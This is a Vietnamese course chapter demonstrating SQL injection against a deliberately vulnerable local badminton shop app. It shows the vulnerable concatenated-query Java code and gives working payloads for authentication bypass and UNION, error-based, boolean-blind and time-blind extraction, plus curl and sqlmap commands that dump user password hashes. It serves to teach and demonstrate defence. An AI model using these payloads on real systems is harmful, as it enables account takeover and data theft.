# CHƯƠNG 5: DEMO TẤN CÔNG SQL INJECTION — HPB-Shop

> **Môi trường thực hành:**
> Ứng dụng web HPB-Shop — cửa hàng bán vợt cầu lông trực tuyến, được xây dựng bằng Spring Boot + MySQL. Backend chạy tại `localhost:8080`, giao diện người dùng tại `localhost:5500`. Toàn bộ các tấn công dưới đây đều được thực hiện trực tiếp trên trình duyệt và công cụ dòng lệnh.

---

## Kịch bản 1 — Authentication Bypass (Bỏ qua xác thực)

### Mô tả kịch bản

Giả sử một kẻ tấn công biết rằng hệ thống HPB-Shop có tài khoản quản trị viên tên là `admin`, nhưng không biết mật khẩu. Thay vì thử từng mật khẩu theo kiểu brute-force, kẻ tấn công lợi dụng lỗ hổng SQL Injection trong form đăng nhập để hoàn toàn bỏ qua bước kiểm tra mật khẩu.

Nguyên nhân cốt lõi là đoạn code trong `UserService.java` ghép trực tiếp thông tin đăng nhập do người dùng nhập vào câu lệnh SQL mà không qua bất kỳ bước xử lý nào:

```java
String sql = "SELECT * FROM users WHERE username='" + identifier
           + "' AND password='" + password + "'";
```

Khi người dùng nhập bình thường, câu SQL hoạt động đúng. Nhưng nếu username chứa ký tự đặc biệt như dấu nháy đơn `'` hoặc chuỗi comment `--`, cấu trúc của câu SQL sẽ bị phá vỡ.

---

### Diễn biến tấn công

**Bước 1 — Mở trang đăng nhập**

Kẻ tấn công truy cập trang đăng nhập của HPB-Shop tại địa chỉ `http://localhost:5500/Dang-nhap.html`. Giao diện hiển thị như một trang đăng nhập thông thường với hai trường Username và Password.

> 📸 **[Hình 5.1 — Giao diện trang đăng nhập HPB-Shop trước khi tấn công]**

---

**Bước 2 — Nhập payload vào form đăng nhập**

Thay vì nhập username và password hợp lệ, kẻ tấn công nhập:

- **Username:** `admin' -- ` *(chú ý có dấu cách sau hai gạch ngang)*
- **Password:** `batky_gicung_duoc` *(bất kỳ chuỗi gì)*

Sau đó nhấn nút Đăng nhập.

> 📸 **[Hình 5.2 — Form đăng nhập với payload SQLi được nhập vào trường Username]**

---

**Bước 3 — Điều gì xảy ra phía sau**

Khi server nhận được input trên, nó ghép nguyên xi vào câu SQL và thực thi:

*Câu SQL bình thường (khi không bị tấn công):*
```sql
SELECT * FROM users
WHERE username='admin' AND password='admin123'
```
→ Chỉ trả về kết quả khi cả username lẫn password đều đúng.

*Câu SQL sau khi bị inject:*
```sql
SELECT * FROM users
WHERE username='admin' -- ' AND password='batky_gicung_duoc'
```

Chuỗi `-- ` là ký hiệu comment trong MySQL — toàn bộ phần phía sau bị bỏ qua. Điều kiện kiểm tra mật khẩu biến mất hoàn toàn. Server chỉ còn kiểm tra `username='admin'`, và vì tài khoản `admin` tồn tại trong database, server lập tức trả về thông tin đăng nhập thành công.

---

**Bước 4 — Kết quả sau tấn công**

Server trả về HTTP 200 kèm JWT token và thông tin tài khoản admin:

```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIs...",
  "user": {
    "userId": 1,
    "username": "admin",
    "role": "admin",
    "status": "active"
  }
}
```

Trình duyệt lưu token vào localStorage và chuyển hướng kẻ tấn công vào trang quản trị Admin Dashboard — với **đầy đủ quyền hạn của quản trị viên**, dù không cần nhập mật khẩu đúng.

> 📸 **[Hình 5.3 — Kẻ tấn công đã vào được Admin Dashboard sau khi bypass xác thực]**

---

### Biến thể — Đăng nhập khi không biết bất kỳ username nào

Nếu kẻ tấn công không biết cả username, có thể dùng payload:

- **Username:** `' OR role='admin' -- `
- **Password:** `x`

Câu SQL trở thành:
```sql
SELECT * FROM users
WHERE username='' OR role='admin' -- ' AND password='x'
```

Điều kiện `OR role='admin'` luôn đúng với ít nhất một người dùng trong DB. Server trả về admin đầu tiên tìm được — tấn công thành công mà không cần biết tên tài khoản.

### Tác hại thực tế

Chỉ với một dòng payload, kẻ tấn công có thể chiếm toàn bộ quyền quản trị hệ thống: xem đơn hàng, thông tin khách hàng, tồn kho, thay đổi giá sản phẩm hoặc xóa dữ liệu tùy ý.

---

## Kịch bản 2 — UNION-based SQL Injection (Đánh cắp dữ liệu người dùng)

### Mô tả kịch bản

Kẻ tấn công sử dụng tính năng tìm kiếm sản phẩm của HPB-Shop như một "cánh cửa hậu" để truy xuất toàn bộ dữ liệu người dùng — bao gồm username, email và password hash — từ bảng `users` trong database.

Kỹ thuật sử dụng là `UNION SELECT`: nối thêm một câu lệnh SELECT thứ hai vào kết quả của query ban đầu, khiến API trả về cả dữ liệu sản phẩm lẫn dữ liệu nhạy cảm trong cùng một response JSON.

Lỗ hổng nằm trong `ProductService.java`:

```java
String sql = "SELECT product_id AS productId, name, brand, price, "
           + "image_url AS imageUrl, description, stock, sku "
           + "FROM products WHERE name LIKE '%" + keyword + "%' "
           + "OR brand LIKE '%" + keyword + "%'";
```

---

### Diễn biến tấn công

**Bước 1 — Sử dụng ô tìm kiếm như bình thường**

Kẻ tấn công vào trang chủ HPB-Shop và gõ từ khóa `Yonex` vào ô tìm kiếm. API trả về danh sách 4 sản phẩm Yonex như bình thường.

> 📸 **[Hình 5.4 — Trang chủ HPB-Shop với chức năng tìm kiếm sản phẩm]**

---

**Bước 2 — Xác định số cột của câu query gốc**

Trước khi thực hiện UNION, kẻ tấn công cần biết query gốc SELECT bao nhiêu cột (vì UNION yêu cầu hai SELECT có cùng số cột). Dùng ORDER BY để thử.

> **Lưu ý quan trọng khi gõ vào ô tìm kiếm:** Dùng `#` thay vì `-- ` làm ký tự comment. JS frontend gọi `.trim()` trước khi gửi request → dấu cách cuối của `-- ` bị xóa → `--` không được MySQL nhận là comment → SQL lỗi → 0 kết quả. Ký tự `#` là comment MySQL, không cần dấu cách.

```
keyword: %' ORDER BY 9#
```
→ Server trả về lỗi 500 → query gốc có **ít hơn 9 cột**.

```
keyword: %' ORDER BY 8#
```
→ Trả về đủ 12 sản phẩm, không lỗi → xác nhận query gốc có đúng **8 cột**.

---

**Bước 3 — Thực hiện UNION SELECT dump bảng users**

Kẻ tấn công dán payload sau vào ô tìm kiếm (dùng `#` thay vì `-- `):

```
%' UNION SELECT user_id, username, email, 0, password, role, 0, 'hack' FROM users#
```

Câu SQL được sinh ra phía server:

```sql
SELECT product_id, name, brand, price, image_url, description, stock, sku
FROM products
WHERE name LIKE '%%' OR brand LIKE '%%'
UNION
SELECT user_id, username, email, 0, password, role, 0, 'hack'
FROM users-- '
```

Phần `%%` khớp với mọi sản phẩm. Toán tử `UNION` nối kết quả của hai SELECT lại với nhau, khiến API trả về cả sản phẩm lẫn toàn bộ hàng trong bảng `users`.

> 📸 **[Hình 5.5 — Payload UNION được nhập vào ô tìm kiếm trên giao diện]**

---

**Bước 4 — Kết quả sau tấn công**

API trả về JSON gồm 12 sản phẩm cộng với 7 dòng dữ liệu user. Các trường `name`, `brand`, `imageUrl`, `description` trong kết quả lần lượt chứa `username`, `email`, `password hash` và `role` của từng tài khoản:

```json
[
  { "productId": 1, "name": "Yonex Astrox 99 Pro", "brand": "Yonex", ... },
  ...
  {
    "productId": 1,
    "name": "admin",
    "brand": "admin@hpb.com",
    "imageUrl": "$2a$10$H7nIjrbVbNwp05DONi0Aio...",
    "description": "admin"
  },
  {
    "productId": 2,
    "name": "customer1",
    "brand": "customer1@hpb.com",
    "imageUrl": "$2a$10$abc...",
    "description": "customer"
  }
]
```

Toàn bộ username, email, BCrypt hash mật khẩu và phân quyền của mọi tài khoản trong hệ thống đã bị lộ trong một request duy nhất.

> 📸 **[Hình 5.6 — Response JSON chứa cả dữ liệu sản phẩm lẫn thông tin tài khoản người dùng]**

---

**Bước 5 — Tự động hóa bằng sqlmap**

Trong thực tế, kẻ tấn công sẽ dùng công cụ `sqlmap` thay vì làm thủ công:

```bash
sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch -D HPBSports_DB -T users --dump
```

`sqlmap` tự động phát hiện lỗ hổng, xác định số cột, xây dựng payload UNION và dump toàn bộ bảng `users` ra file.

> 📸 **[Hình 5.7 — sqlmap tự động dump bảng users ra terminal]**

### Tác hại thực tế

Toàn bộ dữ liệu người dùng (username, email, password hash) bị rò rỉ. Kẻ tấn công có thể dùng công cụ crack hash như Hashcat để phục hồi mật khẩu gốc, sau đó dùng cho tấn công credential stuffing trên các dịch vụ khác mà người dùng có thể dùng cùng mật khẩu.

---

## Kịch bản 3 — Error-based SQL Injection (Rò rỉ thông qua thông báo lỗi)

### Mô tả kịch bản

Đây là kỹ thuật khai thác thông báo lỗi của MySQL. Khi server được cấu hình trả về thông báo lỗi chi tiết về phía client (`server.error.include-message=always`), kẻ tấn công có thể ép MySQL sinh ra lỗi chứa dữ liệu nhạy cảm bên trong message — và đọc dữ liệu đó từ HTTP response.

Hàm được sử dụng là `EXTRACTVALUE()` — một hàm XPath của MySQL. Khi tham số XPath không hợp lệ, MySQL ném ra lỗi có dạng:

```
XPATH syntax error: '~<giá_trị_muốn_đọc>'
```

Kẻ tấn công chỉ cần đặt subquery vào vị trí `<giá_trị_muốn_đọc>`, rồi đọc kết quả từ message lỗi.

---

### Diễn biến tấn công

**Bước 1 — Quan sát trang chi tiết sản phẩm bình thường**

Kẻ tấn công mở trang chi tiết sản phẩm với URL:
```
http://localhost:5500/Chi-tiet-san-pham.html?id=1
```
Trang hiển thị thông tin sản phẩm "Yonex Astrox 99 Pro" như bình thường.

> 📸 **[Hình 5.8 — Trang chi tiết sản phẩm bình thường với id=1]**

---

**Bước 2 — Sửa trực tiếp URL trên thanh địa chỉ để đọc phiên bản MySQL**

Kẻ tấn công thay đổi đường dẫn trong URL từ `/api/products/1` thành:
```
http://localhost:8080/api/products/1 AND extractvalue(1,concat(0x7e,(SELECT version())))
```

Server thực thi câu SQL này, MySQL gặp lỗi XPath và trả về:

```json
{
  "status": 500,
  "error": "Internal Server Error",
  "message": "XPATH syntax error: '~8.4.7'"
}
```

Phiên bản MySQL đang chạy là **8.4.7** — thông tin này giúp kẻ tấn công tra cứu các lỗ hổng CVE phù hợp.

> 📸 **[Hình 5.9 — Response lỗi 500 tiết lộ phiên bản MySQL 8.4.7]**

---

**Bước 3 — Đọc tên database và danh sách bảng**

```
1 AND extractvalue(1,concat(0x7e,(SELECT database())))
```
→ Response: `"XPATH syntax error: '~HPBSports_DB'"` — tên database là **HPBSports_DB**.

```
1 AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name)
  FROM information_schema.tables WHERE table_schema='HPBSports_DB')))
```
→ Response: `"XPATH syntax error: '~cart_items,inventory_logs,order_items,orders,products,users'"` — database có **6 bảng**, bao gồm `users` và `orders`.

---

**Bước 4 — Đọc password hash của admin**

```
1 AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))
```

> 📸 **[Hình 5.10 — Payload Error-based được nhập vào URL, server trả về hash BCrypt của admin]**

Server trả về:
```json
{ "message": "XPATH syntax error: '~$2a$10$H7nIjrbVbNwp05DONi0Aio'" }
```

Vì `EXTRACTVALUE` giới hạn 32 ký tự, kẻ tấn công gửi thêm một request để lấy phần còn lại:
```
1 AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users WHERE username='admin'),33,32)))
```
→ Ghép hai phần lại, có đầy đủ 60 ký tự BCrypt hash.

> 📸 **[Hình 5.11 — Toàn bộ BCrypt hash của admin được ghép lại từ hai request]**

### Tác hại thực tế

Chỉ bằng cách thay đổi URL trên trình duyệt, kẻ tấn công lần lượt đọc được phiên bản database, cấu trúc schema, và mật khẩu hash của bất kỳ tài khoản nào — mà không cần quyền truy cập đặc biệt nào ngoài việc mở một trang web.

---

## Kịch bản 4 — Boolean-based Blind SQL Injection (Dò dữ liệu qua phản hồi TRUE/FALSE)

### Mô tả kịch bản

Trong kịch bản này, server không trả về dữ liệu nhạy cảm trong response và cũng không hiển thị thông báo lỗi. Tuy nhiên kẻ tấn công vẫn có thể rò rỉ dữ liệu từ database bằng cách quan sát **sự khác biệt trong kết quả trả về**: khi điều kiện SQL là đúng thì có sản phẩm, khi sai thì không có sản phẩm.

Kỹ thuật này gọi là **Boolean-based Blind SQLi** — khai thác "kênh bên" (side channel) là số lượng kết quả thay vì nội dung kết quả.

Lỗ hổng trong `ProductService.java`:
```java
sql.append(" AND brand='").append(brand).append("'");
```

---

### Diễn biến tấn công

**Bước 1 — Xác nhận injection point bằng TRUE/FALSE**

Kẻ tấn công truy cập trang sản phẩm theo hãng với các URL sau:

*Payload TRUE (`1=1` luôn đúng):*
```
http://localhost:5500/San-pham-theo-hang.html?brand=Yonex' AND 1=1-- 
```
→ Trang hiển thị **4 sản phẩm Yonex** như bình thường — điều kiện đúng.

*Payload FALSE (`1=2` luôn sai):*
```
http://localhost:5500/San-pham-theo-hang.html?brand=Yonex' AND 1=2-- 
```
→ Trang hiển thị **0 sản phẩm** — điều kiện sai.

Sự khác biệt rõ ràng giữa hai trường hợp xác nhận rằng injection đang hoạt động.

> 📸 **[Hình 5.12 — So sánh: trái là TRUE (4 sản phẩm), phải là FALSE (0 sản phẩm)]**

---

**Bước 2 — Dò từng ký tự của password hash admin**

Bây giờ kẻ tấn công thay `1=1` bằng một điều kiện có ý nghĩa. Ví dụ, để kiểm tra ký tự đầu tiên của password hash admin có phải là `$` không:

```
?brand=Yonex' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$'-- 
```

Nếu trang trả về 4 sản phẩm → ký tự đầu tiên là `$` (TRUE).
Nếu trang trả về 0 sản phẩm → không phải (FALSE).

Lặp lại với từng vị trí (1 đến 60) và từng ký tự có thể, kẻ tấn công dần dần tái tạo được toàn bộ chuỗi hash.

| Vị trí | Điều kiện kiểm tra | Kết quả | Ký tự |
|--------|-------------------|---------|-------|
| 1 | `SUBSTRING(...,1,1)='$'` | 4 sản phẩm | **$** |
| 2 | `SUBSTRING(...,2,1)='2'` | 4 sản phẩm | **2** |
| 3 | `SUBSTRING(...,3,1)='a'` | 4 sản phẩm | **a** |
| 4 | `SUBSTRING(...,4,1)='$'` | 4 sản phẩm | **$** |
| ... | ... | ... | ... |
| 60 | `SUBSTRING(...,60,1)='O'` | 4 sản phẩm | **O** |

> 📸 **[Hình 5.13 — Trình duyệt hiển thị 4 sản phẩm khi payload TRUE (ký tự đúng)]**

---

**Bước 3 — Tự động hóa bằng sqlmap (Boolean technique)**

Thay vì dò thủ công từng ký tự (cần hàng nghìn request), kẻ tấn công dùng sqlmap:

```bash
sqlmap -u "http://localhost:8080/api/products/filter?brand=Yonex" \
  --technique=B \
  --batch \
  -D HPBSports_DB -T users -C username,password \
  --dump
```

`sqlmap` sử dụng binary search để giảm số lần thử từ 256 xuống còn ~8 request mỗi ký tự, dump toàn bộ bảng `users` trong vài phút.

> 📸 **[Hình 5.14 — sqlmap đang chạy Boolean technique, dần dần khôi phục từng ký tự của password hash]**

### Tác hại thực tế

Dù không thấy dữ liệu trực tiếp trong response, kẻ tấn công vẫn rò rỉ được toàn bộ dữ liệu trong database. Kỹ thuật này khó phát hiện hơn UNION-based vì response body trông hoàn toàn bình thường.

---

## Kịch bản 5 — Time-based Blind SQL Injection (Dò dữ liệu qua thời gian phản hồi)

### Mô tả kịch bản

Đây là kỹ thuật tấn công tinh vi nhất trong 5 kịch bản. Không cần response chứa dữ liệu, không cần thông báo lỗi, thậm chí không cần sự khác biệt về số lượng kết quả — kẻ tấn công chỉ dựa vào **thời gian server phản hồi** để suy luận thông tin từ database.

Nguyên lý: nếu điều kiện SQL là đúng thì MySQL sẽ thực thi `SLEEP(3)` (ngủ 3 giây), nếu sai thì phản hồi ngay lập tức. Bằng cách đo độ trễ của từng request, kẻ tấn công phân biệt được TRUE và FALSE.

Lỗ hổng trong `OrderService.java`:
```java
StringBuilder sql = new StringBuilder(
    "SELECT ... FROM orders WHERE user_id=").append(userId);
```

---

### Diễn biến tấn công

**Bước 1 — Lấy JWT token (dùng Auth Bypass từ Kịch bản 1)**

Endpoint này yêu cầu xác thực. Kẻ tấn công lấy token bằng cách kết hợp với kỹ thuật Auth Bypass đã thực hiện ở Kịch bản 1:

```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"loginId":"admin'\'' -- ","password":"x"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
```

---

**Bước 2 — Xác nhận SLEEP hoạt động**

Kẻ tấn công gửi payload kiểm tra ký tự đầu tiên của password hash admin: nếu đó là ký tự `$` (BCrypt hash luôn bắt đầu bằng `$`) thì MySQL sẽ SLEEP 3 giây.

```bash
time curl -s -o /dev/null \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/1 AND IF(
     SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$',
     SLEEP(3), 0)"
```

> 📸 **[Hình 5.15 — Terminal hiển thị lệnh curl đang chờ, đồng hồ đang chạy]**

---

**Bước 3 — Kết quả đo thời gian**

*Payload TRUE (ký tự đầu là `$`):*
```
real    0m3.412s    ← Server delay ~3 giây → ký tự là '$' ✓
```

*Payload FALSE (ký tự đầu là `X`):*
```
real    0m0.087s    ← Server phản hồi ngay → ký tự KHÔNG phải 'X' ✓
```

Sự chênh lệch 3 giây so với dưới 0.1 giây là đủ rõ ràng để phân biệt TRUE/FALSE một cách chắc chắn.

> 📸 **[Hình 5.16 — So sánh thời gian phản hồi: TRUE (3.4s) vs FALSE (0.09s)]**

---

**Bước 4 — Tự động hóa bằng sqlmap (Time-based technique)**

```bash
sqlmap -u "http://localhost:8080/api/customer/orders/my-orders/1" \
  --headers "Authorization: Bearer $TOKEN" \
  --technique=T \
  --time-sec=3 \
  --batch \
  -D HPBSports_DB -T users -C username,password \
  --dump
```

`sqlmap` tự động đo độ trễ từng request và dựng lại từng ký tự. Toàn bộ bảng `users` được dump sau khoảng 10–20 phút (chậm hơn Boolean vì mỗi ký tự cần ~3 giây nếu TRUE).

> 📸 **[Hình 5.17 — sqlmap đang chạy Time-based technique, hiển thị tiến trình dump từng ký tự]**

### Đặc điểm nguy hiểm

Điểm đặc biệt nguy hiểm của kỹ thuật này: response body **hoàn toàn không thay đổi** giữa request bình thường và request tấn công. Nếu chỉ giám sát nội dung response, hệ thống bảo mật sẽ không phát hiện ra bất kỳ dấu hiệu bất thường nào. Chỉ có log thời gian xử lý mới tiết lộ hành vi này.

### Tác hại thực tế

Kẻ tấn công rò rỉ được toàn bộ dữ liệu mà không để lại dấu vết trên nội dung response. Ngoài ra, mỗi request với `SLEEP(3)` giữ một kết nối database trong 3 giây — nếu kẻ tấn công gửi hàng chục request song song, có thể làm cạn kiệt connection pool và gây ra DoS (từ chối dịch vụ).

---

## Tổng kết 5 kịch bản

| Kịch bản | Kỹ thuật | Cần thứ gì | Tốc độ khai thác | Khó phát hiện |
|----------|----------|-----------|-----------------|---------------|
| 1 — Auth Bypass | In-band | Biết username | Tức thì | Thấp |
| 2 — UNION-based | In-band | Xác định số cột | Nhanh | Thấp |
| 3 — Error-based | In-band | Server hiển thị lỗi | Nhanh | Thấp |
| 4 — Boolean Blind | Blind | Phân biệt TRUE/FALSE qua số lượng kết quả | Chậm (~phút) | Trung bình |
| 5 — Time-based Blind | Blind | Chỉ cần đo thời gian phản hồi | Rất chậm (~giờ) | **Cao nhất** |

> 📸 **[Hình 5.18 — Bảng so sánh minh họa 5 loại tấn công (hoặc sơ đồ tổng quan)]**

---

## Kịch bản kết hợp — Chuỗi tấn công thực tế

Trong một cuộc tấn công thực tế, kẻ tấn công thường không dùng riêng lẻ một kỹ thuật mà phối hợp chúng theo trình tự:

1. **Dùng Error-based (Kịch bản 3)** để khám phá cấu trúc database — biết được tên bảng, tên cột.
2. **Dùng UNION-based (Kịch bản 2)** để dump bảng `users` — lấy BCrypt hash của tài khoản admin.
3. **Crack hash offline** bằng Hashcat với wordlist — khôi phục được mật khẩu gốc `admin123`.
4. **Dùng Auth Bypass hoặc đăng nhập bình thường** để vào Admin Dashboard với quyền quản trị cao nhất.

Toàn bộ chuỗi này có thể thực hiện trong vòng dưới 30 phút với một ứng dụng không có biện pháp phòng thủ.

---

## Hướng dẫn demo trực tiếp (~8 phút)

| Thời điểm | Hành động | Ghi chú |
|-----------|----------|---------|
| 0:00 | Mở trang chủ HPB-Shop, giới thiệu ứng dụng | Chiếu giao diện "bình thường" |
| 0:30 | **Kịch bản 1** — Gõ `admin' -- ` vào form đăng nhập | Nhấn mạnh: không nhập đúng mật khẩu |
| 1:30 | **Kịch bản 2** — Dán payload UNION vào ô tìm kiếm | Chiếu JSON response chứa dữ liệu users |
| 3:00 | **Kịch bản 3** — Sửa URL, đọc version + hash admin | Chiếu response 500 với XPATH error |
| 4:00 | **Kịch bản 4** — Chạy `sqlmap --technique=B` | Giải thích binary search qua TRUE/FALSE |
| 5:30 | **Kịch bản 5** — Chạy `sqlmap --technique=T` | Nhấn mạnh: response body không đổi, chỉ có thời gian thay đổi |
| 7:00 | **So sánh với bản đã fix** — `git checkout main`, restart backend | Chạy lại payload → tất cả thất bại (JPA Prepared Statement) |
